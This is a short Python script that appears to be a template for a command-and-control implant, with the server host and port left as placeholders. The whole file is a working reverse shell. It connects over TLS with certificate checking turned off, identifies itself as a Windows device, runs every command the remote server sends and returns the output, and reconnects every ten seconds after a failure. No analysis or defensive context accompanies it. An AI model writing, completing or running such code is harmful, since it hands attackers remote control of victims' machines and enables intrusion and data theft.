import socket
import ssl
import subprocess
import time

C2_HOST = "{{C2_HOST}}"
C2_PORT = {{C2_PORT}}

def connect_to_c2():
    while True:
        try:
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.create_connection((C2_HOST, C2_PORT))
            ssock = context.wrap_socket(sock, server_hostname=C2_HOST)

            ssock.send(b"[+] Connected: Windows Device")

            while True:
                cmd = ssock.recv(4096).decode().strip()
                if not cmd or cmd.lower() in ['exit', 'quit']:
                    break
                proc = subprocess.run(cmd.split(), capture_output=True)
                ssock.send(proc.stdout + proc.stderr)
        except:
            time.sleep(10)

if __name__ == "__main__":
    connect_to_c2()